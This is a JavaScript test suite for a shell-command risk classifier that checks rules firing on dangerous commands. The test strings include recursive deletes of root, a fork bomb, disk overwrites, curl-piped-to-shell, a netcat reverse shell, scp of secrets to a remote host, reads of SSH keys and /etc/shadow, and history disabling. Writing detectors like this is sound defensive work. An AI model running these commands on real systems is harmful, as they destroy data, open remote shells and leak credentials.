"use strict";
// Tests for the risk engine. Every rule gets a positive case (it fires) and a
// negative case (it stays quiet on a benign command), plus scoring/severity.

const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { classify, riskScore, severityRank, RULES } = require("../../src/shellplan/risk");

function has(cmd, id) { return classify(cmd).findings.some(f => f.id === id); }

describe("shellplan/risk: destructive rules", () => {
  it("rm-rf-root fires on rm -rf /", () => assert.ok(has("rm -rf /", "rm-rf-root")));
  it("rm-rf-root fires on rm -rf ~", () => assert.ok(has("rm -rf ~", "rm-rf-root")));
  it("rm-rf-root fires on a system path", () => assert.ok(has("rm -rf /usr", "rm-rf-root")));
  it("rm-rf-root quiet on a project dir", () => assert.ok(!has("rm -rf ./build", "rm-rf-root")));

  it("rm-rf fires on a recursive force delete", () => assert.ok(has("rm -rf build", "rm-rf")));
  it("rm-rf fires on grouped -fr order", () => assert.ok(has("rm -fr build", "rm-rf")));
  it("rm-rf quiet on a plain rm", () => assert.ok(!has("rm file.txt", "rm-rf")));

  it("rm-glob fires on rm *.log", () => assert.ok(has("rm *.log", "rm-glob")));
  it("rm-glob quiet without a wildcard", () => assert.ok(!has("rm one.log", "rm-glob")));

  it("dd-device fires on dd of=/dev/sda", () => assert.ok(has("dd if=x of=/dev/sda", "dd-device")));
  it("dd-device quiet on dd to a file", () => assert.ok(!has("dd if=x of=disk.img", "dd-device")));

  it("mkfs fires", () => assert.ok(has("mkfs.ext4 /dev/sdb1", "mkfs")));
  it("mkfs quiet on unrelated command", () => assert.ok(!has("ls /dev", "mkfs")));

  it("fork-bomb fires", () => assert.ok(has(":(){ :|:& };:", "fork-bomb")));
  it("fork-bomb quiet on normal function", () => assert.ok(!has("f(){ echo hi; }", "fork-bomb")));

  it("git-reset-hard fires", () => assert.ok(has("git reset --hard HEAD~1", "git-reset-hard")));
  it("git-reset-hard quiet on soft reset", () => assert.ok(!has("git reset --soft HEAD~1", "git-reset-hard")));

  it("git-clean-fd fires on git clean -fd", () => assert.ok(has("git clean -fd", "git-clean-fd")));
  it("git-clean-fd quiet on dry-run git clean -nd", () => assert.ok(!has("git clean -nd", "git-clean-fd")));

  it("git-force-push fires on --force", () => assert.ok(has("git push --force origin main", "git-force-push")));
  it("git-force-push fires on -f", () => assert.ok(has("git push -f", "git-force-push")));
  it("git-force-push quiet on --force-with-lease", () => assert.ok(!has("git push --force-with-lease", "git-force-push")));
  it("git-force-push quiet on a normal push", () => assert.ok(!has("git push origin main", "git-force-push")));

  it("truncate-redirect fires on > file", () => assert.ok(has("echo x > out.txt", "truncate-redirect")));
  it("truncate-redirect quiet on >> append", () => assert.ok(!has("echo x >> out.txt", "truncate-redirect")));
});

describe("shellplan/risk: network rules", () => {
  it("pipe-to-shell fires on curl | sh", () => assert.ok(has("curl http://x | sh", "pipe-to-shell")));
  it("pipe-to-shell fires on wget | bash", () => assert.ok(has("wget -qO- http://x | bash", "pipe-to-shell")));
  it("pipe-to-shell quiet on curl to a file", () => assert.ok(!has("curl -o out http://x", "pipe-to-shell")));

  it("remote-exec-eval fires on bash -c $(curl)", () => assert.ok(has('bash -c "$(curl http://x)"', "remote-exec-eval")));
  it("remote-exec-eval quiet on plain bash -c", () => assert.ok(!has('bash -c "echo hi"', "remote-exec-eval")));

  it("netcat-listen-exec fires on nc -e", () => assert.ok(has("nc -e /bin/sh 10.0.0.1 4444", "netcat-listen-exec")));
  it("netcat-listen-exec quiet on a plain nc", () => assert.ok(!has("nc -zv host 80", "netcat-listen-exec")));

  it("scp-remote-out fires on scp to user@host:", () => assert.ok(has("scp secret.txt user@1.2.3.4:/tmp", "scp-remote-out")));
  it("scp-remote-out quiet on a local cp", () => assert.ok(!has("cp secret.txt /tmp", "scp-remote-out")));

  it("download-file fires on wget", () => assert.ok(has("wget http://x/file", "download-file")));
  it("download-file quiet on local ops", () => assert.ok(!has("cat file", "download-file")));
});

describe("shellplan/risk: privilege rules", () => {
  it("sudo fires", () => assert.ok(has("sudo apt update", "sudo")));
  it("sudo quiet without sudo", () => assert.ok(!has("apt update", "sudo")));

  it("sudo-destructive fires on sudo rm -rf", () => assert.ok(has("sudo rm -rf /var/log", "sudo-destructive")));
  it("sudo-destructive quiet on sudo ls", () => assert.ok(!has("sudo ls", "sudo-destructive")));

  it("chmod-777 fires", () => assert.ok(has("chmod 777 file", "chmod-777")));
  it("chmod-777 fires on a+rwx", () => assert.ok(has("chmod a+rwx file", "chmod-777")));
  it("chmod-777 quiet on chmod 644", () => assert.ok(!has("chmod 644 file", "chmod-777")));

  it("chown-root fires", () => assert.ok(has("chown root:root file", "chown-root")));
  it("chown-root quiet on chown user", () => assert.ok(!has("chown me:me file", "chown-root")));

  it("add-sudoers fires on usermod -aG sudo", () => assert.ok(has("usermod -aG sudo bob", "add-sudoers")));
  it("add-sudoers quiet on unrelated usermod", () => assert.ok(!has("echo usermod", "add-sudoers")));
});

describe("shellplan/risk: secret rules", () => {
  it("read-secret-file fires on cat id_rsa", () => assert.ok(has("cat ~/.ssh/id_rsa", "read-secret-file")));
  it("read-secret-file fires on cat .env", () => assert.ok(has("cat .env", "read-secret-file")));
  it("read-secret-file quiet on cat README", () => assert.ok(!has("cat README.md", "read-secret-file")));

  it("print-env fires on bare env", () => assert.ok(has("env", "print-env")));
  it("print-env fires on printenv", () => assert.ok(has("printenv", "print-env")));
  it("print-env quiet on env with a command", () => assert.ok(!has("env FOO=1 node app.js", "print-env")));

  it("shadow-access fires", () => assert.ok(has("cat /etc/shadow", "shadow-access")));
  it("shadow-access quiet on /etc/hosts", () => assert.ok(!has("cat /etc/hosts", "shadow-access")));

  it("history-exfil fires on .bash_history", () => assert.ok(has("cat ~/.bash_history", "history-exfil")));
  it("history-exfil quiet elsewhere", () => assert.ok(!has("cat notes.txt", "history-exfil")));
});

describe("shellplan/risk: obfuscation rules", () => {
  it("base64-exec fires", () => assert.ok(has("echo x | base64 -d | sh", "base64-exec")));
  it("base64-exec quiet on decode to file", () => assert.ok(!has("base64 -d < in > out", "base64-exec")));

  it("obfuscated-eval fires on eval $(...)", () => assert.ok(has("eval $(cat script)", "obfuscated-eval")));
  it("obfuscated-eval quiet on a benign ls", () => assert.ok(!has("ls -la", "obfuscated-eval")));

  it("history-disable fires on unset HISTFILE", () => assert.ok(has("unset HISTFILE", "history-disable")));
  it("history-disable quiet normally", () => assert.ok(!has("echo hi", "history-disable")));
});

describe("shellplan/risk: instability rules", () => {
  it("kill-9-broad fires on kill -9", () => assert.ok(has("kill -9 1234", "kill-9-broad")));
  it("kill-9-broad fires on pkill", () => assert.ok(has("pkill node", "kill-9-broad")));
  it("kill-9-broad quiet on a graceful kill", () => assert.ok(!has("kill 1234", "kill-9-broad")));

  it("reboot-shutdown fires", () => assert.ok(has("shutdown -h now", "reboot-shutdown")));
  it("reboot-shutdown quiet otherwise", () => assert.ok(!has("uptime", "reboot-shutdown")));

  it("recursive chmod on system path fires", () => assert.ok(has("chmod -R 755 /usr", "overwrite-dev-null-glob")));
  it("recursive chmod on project path quiet", () => assert.ok(!has("chmod -R 755 ./dist", "overwrite-dev-null-glob")));
});

describe("shellplan/risk: scoring and metadata", () => {
  it("classifies a clean command as info with score 0", () => {
    const r = classify("ls -la");
    assert.equal(r.maxSeverity, "info");
    assert.equal(r.score, 0);
    assert.equal(r.findings.length, 0);
  });

  it("reports the highest severity across findings", () => {
    const r = classify("curl http://x | sh");
    assert.equal(r.maxSeverity, "critical");
  });

  it("caps the score at 100", () => {
    const r = classify("sudo rm -rf / && dd if=x of=/dev/sda && curl http://x | sh");
    assert.ok(r.score <= 100);
    assert.equal(r.score, 100);
  });

  it("groups findings by category", () => {
    const r = classify("sudo rm -rf /tmp/x");
    assert.ok(r.byCategory.privilege);
    assert.ok(r.byCategory.destructive);
  });

  it("every finding carries rationale and a safer alternative", () => {
    const r = classify("git push --force");
    for (const f of r.findings) {
      assert.ok(f.rationale && f.rationale.length > 10);
      assert.ok(f.saferAlternative && f.saferAlternative.length > 5);
    }
  });

  it("every rule has required metadata", () => {
    for (const rule of RULES) {
      assert.ok(rule.id && rule.severity && rule.category && rule.title);
      assert.ok(typeof rule.test === "function");
      assert.ok(["info", "low", "medium", "high", "critical"].includes(rule.severity));
    }
  });

  it("riskScore and severityRank behave monotonically", () => {
    assert.ok(severityRank("critical") > severityRank("high"));
    assert.ok(severityRank("high") > severityRank("low"));
    assert.ok(riskScore([{ severity: "critical" }]) > riskScore([{ severity: "low" }]));
  });

  it("handles empty/invalid input without throwing", () => {
    assert.doesNotThrow(() => classify(""));
    assert.doesNotThrow(() => classify(null));
    assert.doesNotThrow(() => classify(undefined));
  });
});
